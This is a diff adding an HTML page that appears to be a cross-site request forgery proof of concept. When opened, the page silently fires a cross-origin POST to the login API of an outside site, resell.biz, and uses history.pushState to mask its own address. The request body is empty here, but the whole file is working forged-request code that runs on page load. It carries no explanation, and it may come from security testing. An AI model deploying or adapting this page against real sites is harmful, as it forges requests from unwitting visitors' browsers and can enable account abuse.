@@ -1,1 +1,22 @@
-
+<!DOCTYPE html>
+<html>
+    <body>
+    <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/www.resell.biz\/api\/auth\/login", true);
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
+        xhr.withCredentials = false;
+        var body = "";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    </body>
+</html>
